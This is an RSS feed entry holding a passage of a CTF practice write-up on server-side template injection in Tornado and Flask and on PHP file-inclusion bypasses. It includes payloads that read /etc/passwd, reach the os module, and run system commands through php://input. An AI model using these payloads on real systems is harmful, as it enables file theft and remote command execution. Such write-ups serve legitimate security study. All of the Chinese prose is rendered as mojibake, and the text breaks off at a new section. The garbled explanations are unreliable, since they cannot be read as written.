<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>StarofEdenğŸŒ¸ â€¢ Posts by &#34;ctf&#34; tag</title>
        <link>https://StarofEden.github.io</link>
        <description></description>
        <language>zh-CN</language>
        <pubDate>Sat, 15 Apr 2023 00:00:00 +0800</pubDate>
        <lastBuildDate>Sat, 15 Apr 2023 00:00:00 +0800</lastBuildDate>
        <category>åšå®¢ç¾åŒ–</category>
        <category>ç«ç‹æ’ä»¶</category>
        <category>webå®‰å…¨</category>
        <category>ctf</category>
        <category>blog åšå®¢ç¾åŒ–</category>
        <item>
            <guid isPermalink="true">https://starofeden.github.io/2023/04/15/xctf%E5%88%B7%E9%A2%98/</guid>
            <title>xctfåˆ·é¢˜</title>
            <link>https://starofeden.github.io/2023/04/15/xctf%E5%88%B7%E9%A2%98/</link>
            <category>ctf</category>
            <pubDate>Sat, 15 Apr 2023 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;æ¨¡æ¿æ³¨å…¥&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#æ¨¡æ¿æ³¨å…¥&#34;&gt;#&lt;/a&gt; &lt;strong&gt;æ¨¡æ¿æ³¨å…¥&lt;/strong&gt;&lt;/h1&gt;
&lt;h2 id=&#34;tornado-æ¡†æ¶&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#tornado-æ¡†æ¶&#34;&gt;#&lt;/a&gt; Tornado æ¡†æ¶&lt;/h2&gt;
&lt;h3 id=&#34;çŸ¥è¯†ç‚¹&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#çŸ¥è¯†ç‚¹&#34;&gt;#&lt;/a&gt; çŸ¥è¯†ç‚¹ï¼š&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;render å‡½æ•°ï¼šé€šè¿‡ä¼ é€’ä¸åŒçš„å‚æ•°å½¢æˆä¸åŒçš„æ”¹å˜&lt;/li&gt;
&lt;li&gt;tornado render æ¨¡æ¿æ³¨å…¥æ¼æ´ï¼š&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;tornado renderæ˜¯pythonä¸­çš„ä¸€ä¸ªæ¸²æŸ“å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯ä¸€ç§æ¨¡æ¿ï¼Œé€šè¿‡è°ƒç”¨çš„å‚æ•°ä¸åŒï¼Œç”Ÿæˆä¸åŒçš„ç½‘é¡µï¼Œå¦‚æœç”¨æˆ·å¯¹renderå†…å®¹å¯æ§ï¼Œä¸ä»…å¯ä»¥æ³¨å…¥XSSä»£ç ï¼Œè€Œä¸”è¿˜å¯ä»¥é€šè¿‡&amp;#123;&amp;#123;&amp;#125;&amp;#125;è¿›è¡Œä¼ é€’å˜é‡å’Œæ‰§è¡Œç®€å•çš„è¡¨è¾¾å¼ã€‚&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;å¾—åˆ°cookie_secretçš„å€¼&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#å¾—åˆ°cookie_secretçš„å€¼&#34;&gt;#&lt;/a&gt; å¾—åˆ° cookie_secret çš„å€¼ï¼š&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;error?msg=&amp;#123;&amp;#123;handler.settings&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;em&gt;handler.settings æ˜¯ tornado æ¡†æ¶çš„ä¸€ä¸ªé™„å±æ–‡ä»¶&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&#34;flasskæ¨¡æ¿æ³¨å…¥&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#flasskæ¨¡æ¿æ³¨å…¥&#34;&gt;#&lt;/a&gt; flassk æ¨¡æ¿æ³¨å…¥&lt;/h2&gt;
&lt;h3 id=&#34;æ€è·¯&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#æ€è·¯&#34;&gt;#&lt;/a&gt; æ€è·¯ï¼š&lt;/h3&gt;
&lt;p&gt;æ‰¾åˆ°çˆ¶ç±» &amp;lt;type â€˜objectâ€™&amp;gt;â€“&amp;gt; å¯»æ‰¾å­ç±»â€“&amp;gt; æ‰¾å…³äºå‘½ä»¤æ‰§è¡Œæˆ–è€…æ–‡ä»¶æ“ä½œçš„æ¨¡å—ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;å‡ ä¸ªé­”æœ¯æ–¹æ³•ï¼š&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__class__  è¿”å›ç±»å‹æ‰€å±çš„å¯¹è±¡&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__mro__    è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»å…ƒç»„ï¼Œæ–¹æ³•åœ¨è§£ææ—¶æŒ‰ç…§å…ƒç»„çš„é¡ºåºè§£æã€‚&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__base__   è¿”å›è¯¥å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;// __base__å’Œ__mro__éƒ½æ˜¯ç”¨æ¥å¯»æ‰¾åŸºç±»çš„&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__subclasses__   æ¯ä¸ªæ–°ç±»éƒ½ä¿ç•™äº†å­ç±»çš„å¼•ç”¨ï¼Œè¿™ä¸ªæ–¹æ³•è¿”å›ä¸€ä¸ªç±»ä¸­ä»ç„¶å¯ç”¨çš„çš„å¼•ç”¨çš„åˆ—è¡¨&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__init__  ç±»çš„åˆå§‹åŒ–æ–¹æ³•&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__globals__  å¯¹åŒ…å«å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸çš„å¼•ç”¨&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;## &amp;#123;&amp;#123;&amp;#125;&amp;#125;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;* ä¼ é€’å˜é‡&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;* æ‰§è¡Œä¸€äº›ç®€å•è¡¨è¾¾å¼&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;hr&gt;
&lt;ul&gt;
&lt;li&gt;
ï¼šæŸ¥çœ‹å…¨å±€å˜é‡
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;æ­¥éª¤&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#æ­¥éª¤&#34;&gt;#&lt;/a&gt; æ­¥éª¤ï¼š&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;å¯»æ‰¾å¯ç”¨å¼•ç”¨&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#123;&amp;#x27;&amp;#x27;.__class__.__mro__[2].__subclasses__()&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;æ–‡ä»¶è¯»å–ï¼Œ &lt;code&gt;[40]&lt;/code&gt;  æ˜¯ tupe file ç±»å‹å‡ºç°ä½ç½®ï¼ˆä» 0 å¼€å§‹çš„ä½ç½®ï¼‰&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#123; [].__class__.__base__.__subclasses__()[40](&amp;#x27;/etc/passwd&amp;#x27;).read() &amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;å‘½ä»¤æ‰§è¡Œ (æœ‰ä¸€ä¸ª &amp;lt;class â€˜site._Printerâ€™&amp;gt; ç±»å‹)&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#123;&amp;#x27;&amp;#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&amp;#x27;os&amp;#x27;].listdir(&amp;#x27;.&amp;#x27;)&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;[71]&lt;/code&gt;  ä¸º &amp;lt;class â€˜site._Printerâ€™&amp;gt; å‡ºç°ä½ç½®&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;2æ–‡ä»¶include&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2æ–‡ä»¶include&#34;&gt;#&lt;/a&gt; 2. æ–‡ä»¶ include&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;5.10 æ›´æ–°ï¼šå¥½ä¹…æ²¡åˆ·é¢˜äº†ï¼Œåšä¸ª md å¤ä¹ ä¸€ä¸‹&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;file_includeè¿‡æ»¤&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#file_includeè¿‡æ»¤&#34;&gt;#&lt;/a&gt; file_include (è¿‡æ»¤)&lt;/h3&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;highlight_file&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;./check.php&amp;quot;&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;filename&amp;#x27;&lt;/span&gt;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt;  = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;filename&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;å°è¯•ç”¨ php://filter:&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;?filename=php://filter/read=convert.base64-encode/reasource=check.php&lt;br&gt;
 å›æ˜¾ &amp;quot;do not hack!&amp;quot;&lt;br&gt;
 é‚£åº”è¯¥æ˜¯è¿‡æ»¤&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;ä½¿ç”¨è¿‡æ»¤å™¨ convert.* (string.* è¢«è¿‡æ»¤)&lt;/li&gt;
&lt;li&gt;æ„é€  URLï¼š&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;?filename=php://filter/convert.iconv.a.b/resource=flag.php&lt;br&gt;
 &lt;code&gt;flagå¯èƒ½åœ¨flag.php&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;ä½¿ç”¨ bp å¯¹ a,b è¿›è¡Œçˆ†ç ´ (é›†æŸç‚¸å¼¹)ï¼Œå­—å…¸å¦‚ä¸‹ï¼š&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;UCS-4*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UCS-4BE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UCS-4LE*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UCS-2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UCS-2BE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UCS-2LE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UTF-32*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UTF-32BE*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UTF-32LE*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UTF-16*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UTF-16BE*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UTF-16LE*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UTF-7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UTF7-IMAP&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UTF-8*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ASCII*&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;web_php_include&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#web_php_include&#34;&gt;#&lt;/a&gt; web_php_include&lt;/h2&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;show_source&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;hello&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$page&lt;/span&gt;=&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;page&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; (&lt;span class=&#34;title function_ invoke__&#34;&gt;strstr&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$page&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;php://&amp;quot;&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$page&lt;/span&gt;=&lt;span class=&#34;title function_ invoke__&#34;&gt;str_replace&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;php://&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$page&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;//è¿‡æ»¤äº†php://&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$page&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;çŸ¥è¯†ç‚¹-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#çŸ¥è¯†ç‚¹-2&#34;&gt;#&lt;/a&gt; çŸ¥è¯†ç‚¹&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;ç”±é¢˜å¯çŸ¥è¿‡æ»¤äº† php://, è€ƒè™‘ä½¿ç”¨å…¶å®ƒä¼ªåè®®&lt;/li&gt;
&lt;li&gt;ä¼ªåè®®åŒ…æ‹¬ï¼š&lt;br&gt;
&lt;strong&gt;file åè®®&lt;/strong&gt;ï¼š&lt;br&gt;
allow_url_fopen ï¼šoff/on&lt;br&gt;
allow_url_includeï¼šoff/on&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;file://  &lt;code&gt;ç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ&lt;/code&gt; ï¼Œåœ¨ CTF ä¸­é€šå¸¸ç”¨æ¥è¯»å–æœ¬åœ°æ–‡ä»¶çš„ä¸”ä¸å— allow_url_fopen ä¸ allow_url_include çš„å½±å“ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;php:// åè®®&lt;/strong&gt;:&lt;br&gt;
 ä»… php://inputã€ php://stdinã€ php://memory å’Œ php://temp éœ€è¦å¼€å¯ allow_url_includeã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;data:// åè®®&lt;/strong&gt;ï¼šæ»¡è¶³åŒ off æ¡ä»¶&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;strstr&lt;/strong&gt; å‡½æ•°ï¼š&lt;br&gt;
å‡½æ•°ç”¨äºåˆ¤æ–­å­—ç¬¦ä¸² str2 æ˜¯å¦æ˜¯ str1 çš„å­ä¸²ã€‚å¦‚æœæ˜¯ï¼Œåˆ™è¯¥å‡½æ•°è¿”å› str1 å­—ç¬¦ä¸²ä» str2 ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®å¼€å§‹åˆ° str1 ç»“å°¾çš„å­—ç¬¦ä¸²ï¼›å¦åˆ™ï¼Œè¿”å› NULLã€‚&lt;/li&gt;
&lt;li&gt;**str_replace ()** å‡½æ•°ï¼š&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;ä»¥å…¶ä»–å­—ç¬¦æ›¿æ¢å­—ç¬¦ä¸²ä¸­çš„ä¸€äº›å­—ç¬¦ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰ã€‚&lt;br&gt;
ä¾‹å¦‚ï¼šæŠŠå­—ç¬¦ä¸² â€œHello world!â€ ä¸­çš„å­—ç¬¦ â€œworldâ€ æ›¿æ¢ä¸º â€œShanghaiâ€ï¼š&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;str_replace&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;world&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;Shanghai&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;Hello world!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;æœ¬é¢˜æ„æ€ä¸ºå½“ä¼ ç»™ page çš„å‚æ•°æœ‰ phpï¼š// æ—¶æ›¿æ¢ä¸ºç©º&lt;/p&gt;
&lt;h3 id=&#34;è§£é¢˜æ­¥éª¤&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#è§£é¢˜æ­¥éª¤&#34;&gt;#&lt;/a&gt; è§£é¢˜æ­¥éª¤&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;ä½¿ç”¨ phpï¼š//input&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;æ„é€  URLï¼š?page=Php://input// å¤§å†™ç»•è¿‡&lt;br&gt;
ä½¿ç”¨ bp ä¼ å…¥ï¼š&lt;br&gt;
a=&lt;?php system(&#39;ls&#39;);?&gt;a&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;playload:&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;a = &amp;lt;?php system(&amp;#x27;cat fl4gisisish3r3.php&amp;#x27;);?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h1 id=&#34;cat&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cat&#34;&gt;#&lt;/a&gt; cat&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;å¹¶ä¸æ˜¯å‘½ä»¤æ³¨å…¥&lt;/li&gt;
